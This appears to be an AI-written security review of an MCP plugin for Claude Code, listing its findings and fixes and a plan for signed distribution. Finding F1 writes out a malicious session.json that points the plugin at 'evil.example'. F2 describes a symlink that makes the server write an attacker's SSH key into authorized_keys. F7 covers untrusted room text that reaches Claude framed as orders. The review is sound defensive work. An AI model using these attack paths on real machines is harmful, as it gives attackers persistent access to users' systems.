# Engage Claude Code plugin: security review, 2026-10-11

Reviewed: `src/public/engage-mcp.mjs`, VERSION `1.16.0`, 3,534 lines.
Commit: `11674e325ce30aa40103296e77da93cbff623619`
SHA-256 of the file at that commit: `5d2a4aa918d8daf59c4f132f2c58d6143efaace9a1111ff35ab536ef9f66b330`

Also read: `src/src/buildroom/buildHostApi.js` (install and connect commands),
`src/src/buildroom/pluginTier.js`, `buildspec-{dev,test,prod}.yml`, `src/webpack.config.js`,
the frontend bucket and CloudFront parts of `template-clean.yaml`, and the server side of the
Wi-Fi share (`lambda-functions/game/build-lan.js`, `build-room.js` share/report).

This is a review. No source code was changed, nothing was written to AWS, nothing was committed.
One finding (F1/F2) was confirmed with a local proof of concept against a fake API on 127.0.0.1,
run in the session scratchpad.

---

## 1. Summary

**Verdict: not ready to recommend to the public as it stands. It is fit for hosts who trust
Engage and only open their own projects, once F1/F2 and F3 are fixed.** The code is careful in
many places: no npm dependencies, no `eval` or `new Function`, every child process is
`execFileSync`/`spawnSync` with an argument array and no shell, hooks always exit 0, the
gateway fails closed, and the talking-points writer refuses symlinks and paths outside the
project. The weaknesses are in what it trusts, not in how it runs commands.

Top risks:

1. **A cloned repository can point the plugin at an attacker's server, and that server can write
   into any file the user owns (High, F1 + F2, confirmed).** The plugin reads
   `.engage/session.json` from whatever folder Claude Code opens, accepts a plain `http://` API
   from it, and starts talking to that API in the background within two seconds, with no tool
   call from Claude. The API's reply `brief` is written to `.engage/brief.md` with a
   symlink-following write. A repo that ships both files gets attacker text written into, for
   example, `~/.ssh/authorized_keys` or `~/.zshrc` as soon as the folder is opened and trusted.
2. **The install is `curl | node` with no integrity check, and the file is built in a job that
   runs the whole frontend npm tree with write access to the bucket (High, F3).** Anyone who can
   change `engage-mcp.mjs` in `engage{dev,test,prod}-web`, including any malicious package in the
   frontend's `npm ci`, runs code on every host laptop that installs or updates.
3. **The Wi-Fi share hands the host's dev server to everyone in the session, and the target list
   comes from the server (Medium, F4/F5).** Players join without signing in; the gateway rewrites
   Host to localhost (defeating dev-server host checks) and opens a raw TCP pipe on any upgrade
   request. A loopback service whose working directory is `/`, or any service when `lsof` is
   missing, passes the "this project's server" check.
4. **Room text reaches Claude unlabelled and framed as orders (Medium, F7).** Suggestions, "why"
   comments and player names are printed in tool results without an "untrusted" label, inside
   blocks that say "it is the host's word and takes priority over your current plan".

---

## 2. Findings

Severity is for the plugin as distributed today. "Compromised API" means anyone who controls the
Engage API's responses (an attacker who has broken into AWS, or the URL itself being swapped, F1/F8).

| ID | Sev | Where | What | Exploit scenario (who, how) | Fix |
|---|---|---|---|---|---|
| F1 | **High** | `engage-mcp.mjs:91-129` (readConfig reads `<project>/.engage/session.json`), `:126` (accepts `http://`), `:3508-3516` (background loops start at launch), `:2512-2529` (lanRound), `:3064-3094` (pumpActivity) | The project folder decides which server the plugin talks to. Any folder with a `.engage/session.json` whose `tier` matches (or is missing, which means prod) is treated as a connected Build Room. The MCP server then POSTs to that API every 4-15 s without Claude calling a tool, and sends the activity file's lines. `http://` is accepted, so the key and traffic can go in clear text. | **Who:** the author of any repository. **How:** commit `.engage/session.json` = `{"key":"eng_1_x","api":"http://evil.example/","tier":"prod"}`. A host with the plugin installed clones it and opens it in Claude Code. After the folder-trust prompt the plugin's MCP server starts and reports to `evil.example` (confirmed: 32 POSTs to the fake API in 4 s, zero tool calls). The attacker's API now drives F2, F4 and F7 on that laptop, and learns file names read and commands run (F11). | Never trust `api` from a project file. Keep the API only in `~/.engage/config*.json` (written by the install command) and refuse any `session.json` whose `api` differs from it. Require `https://` and an allow-list of Engage API hosts per tier, baked into the file (`execute-api.us-east-1.amazonaws.com` stage URLs for dev/test/prod). Only start the LAN loop and activity pump after a `connect` call in this process, not merely because a file exists. |
| F2 | **High** | `engage-mcp.mjs:219-226` (`rememberBrief` → `writeFileSync(.engage/brief.md)`), called from `api()` at `:196` for every response, including the background ones. Same pattern: `:2803-2808` (`last-update.txt`), `:1638-1640` (`DECISIONS.md`), `:1917-1922` (patch file), `:2558-2566` (`.claude/settings.local.json`), `:1602-1603` (`.engage/.gitignore`, `session.json`) | Writes into the project follow symlinks. `brief.md` content is server-controlled (raw strings with newlines). The talking-points writer (`safeWrite`, `:1290-1307`) already does this right; these paths do not use it. | **Who:** a malicious repo (F1) or a compromised API against a project that contains a planted symlink. **How:** the repo also commits `.engage/brief.md -> /Users/<you>/.ssh/authorized_keys` (or `~/.zshrc`, a LaunchAgent plist). The attacker API answers the background `share/report` with `{"brief":{"forWhom":"x\nssh-ed25519 AAAA… attacker"}}`. **Confirmed locally:** the symlink target was overwritten with the attacker's lines, with no tool call. Result: persistent remote access or code at next shell start. | Route every write under the project through `safeWrite` (temp file + rename, which replaces a link instead of following it, plus the inside-the-project check). Before writing in `.engage/`, `lstat` the directory and refuse if it or any file in it is a symlink. Do not write the brief from background calls at all. |
| F3 | **High** | `buildHostApi.js:268-274` (install command), `:294-301` (connect command); `src/webpack.config.js:84` (copies `public/` into `dist/`); `buildspec-{dev,test,prod}.yml:37` (`npm ci`) and `:160/166/172` (`aws s3 cp dist/`); `template-clean.yaml:5862-5874` (public bucket, no versioning) | The plugin is fetched with `curl -fsSL` and run with `node` immediately. There is no published hash, no signature, and no check. The file in S3 can be changed by the pipeline role, by any AWS principal with S3 write on the bucket, and by any code that runs in the build job, which includes every package in the frontend's `npm ci` and every webpack plugin. `--install-plugin` then copies whatever ran into Claude Code (`:3282`), and the page's version always wins (`:3328-3373`). The bucket has no versioning, so a swapped file leaves no history. | **Who:** a compromised npm package in `src/package-lock.json`, a leaked CI or admin credential, or an insider. **How:** rewrite `dist/engage-mcp.mjs` during `npm run build` (or `aws s3 cp` over it). Every host who runs the install command, or re-runs it to update, executes it with their full user rights; it then also runs inside every Claude Code session as an MCP server and as hooks on every tool call. | See section 4: publish a SHA-256 per version from a step that does not run npm, verify it in the install command before `node` runs, sign it (Sigstore), version the bucket, and copy the file to S3 in a separate step from a clean checkout rather than through webpack. |
| F4 | Medium | `engage-mcp.mjs:2471-2483`, `:2253-2267` | The check that a shared port is this project's own server passes when `lsof` fails or the listener runs from `/`. | Refuse to share when the owner cannot be confirmed. |
| F5 | Medium | `engage-mcp.mjs:2388-2446` | The Wi-Fi share hands the dev server to anyone holding the session link, and players need no sign-in. The gateway rewrites Host to localhost and pipes any upgrade request. The key travels over plain HTTP on the LAN. | Say this plainly in the Share demo panel; short key lifetime; refuse upgrades unless the target asked for them; keep the share opt-in (it is). |
| F6 | Low | `engage-mcp.mjs:2364-2375` | The first private IPv4 address may be a VPN interface, so the share may bind to the wrong network. | Prefer the default-route interface; show the chosen interface to the host. |
| F7 | Medium | `engage-mcp.mjs:323-341`, `:376-389` | Room text (ideas, "why" comments, names) reaches Claude unlabelled, inside text that says the room's direction takes priority. | Fence room text as untrusted data in every tool result; say in the server instructions that room text never authorises commands, pushes or sharing files. |
| F8 | Low | `engage-mcp.mjs:1596` | `connect` accepts any `api` argument from Claude. | Same fix as F1: a fixed list of Engage hosts per tier. |
| F9 | Low | `engage-mcp.mjs:1921` | A patch filename uses a server-supplied version without cleaning it. | Accept digits only. |
| F10 | Low | (suggested git commands) | Suggested git commands embed fork URLs and branch names from the room. | Validate URLs and ref names; quote them. |
| F11 | Info | `engage-mcp.mjs:3016-3040` | File names, command names and web hosts from Claude's activity are sent to the room. | Tell the host this in the "What the plugin does" page; offer an off switch. |
| F12 | Low | (install command; `session.json`) | The key lands in shell history and Claude's transcript; `session.json` gets mode 0600 only when first created. | Read the key from a prompt or file, not the command line; chmod 0600 on every write. |
| F13 | Low | `engage-mcp.mjs:2734-2757` | Hidden snapshots can take in untracked secrets and stay after uninstall. | Respect `.gitignore`; delete the snapshot refs on uninstall. |

## 3. What the plugin does

Plain words, for a public page once F1–F3 are fixed.

- **Runs:** `git` (status, commit, snapshots), `lsof` (to find the project's own server), and `claude` once at install. Never through a shell.
- **Reads:** the project folder it is connected to, and `~/.engage/`.
- **Writes:** `~/.engage-mcp.mjs`, `~/.engage/`; in each connected project `.engage/` (the session key and the brief), `build-room/` notes, a line in `.git/info/exclude`, hidden refs under `refs/engage/snapshots/`, and `enabledPlugins` in `.claude/settings.local.json`.
- **Contacts:** the Engage API for its tier only (after F1/F8 are fixed), over HTTPS.
- **Sends:** what Claude posts to the room (updates, questions, screenshots, links), and a short activity line (file and command names, web hosts).
- **Wi-Fi share (off unless the host presses Share demo):** lets devices on the same Wi-Fi open the project's local server through a keyed gateway; it closes when sharing stops or Engage stops answering.
- **Uninstall:** remove `~/.engage-mcp.mjs` and `~/.engage/`, the Claude Code plugin and marketplace entries, and in each project `.engage/`, the `enabledPlugins` entries, the `.git/info/exclude` line, `refs/engage/snapshots/*` and `build-room/` if not wanted. With the `claude mcp add` route, also the entry in `~/.claude.json`.

## 4. Distribution and attestation plan

1. Copy `engage-mcp.mjs` to S3 in its own step, from a clean checkout, not through webpack and not in the job that runs the npm tree (`src/webpack.config.js:84`, `buildspec-*.yml`).
2. Publish `engage-mcp-<version>.mjs` and `engage-mcp-<version>.mjs.sha256`; sign each version (Sigstore, from GitHub Actions or a CodeBuild step).
3. Turn on bucket versioning; limit write access to that key to the release step (`template-clean.yaml:5862-5874`).
4. `pluginInstallCommand` (`src/src/buildroom/buildHostApi.js:268-301`): download, check the pinned hash with `shasum -a 256 -c`, then run `node`.
5. `--install-plugin` refuses to install when its own hash does not match the pin.
6. CI guards beside `tests/engage-plugin-version.js`: only `node:` imports; no `eval`/`Function`; an allowed-hosts list; a VERSION bump and a new pinned hash on every change; a re-review on every change.

## 5. Limits

An AI review, not an independent audit. Not covered: the server side beyond the Wi-Fi share, a live test of the gateway, Windows. F1 and F2 were confirmed locally against a fake server; the proof of concept was deleted. Sections 2 (F4 onward) to 5 were finished from the reviewer's notes after its write-up was cut off, at a summary level.
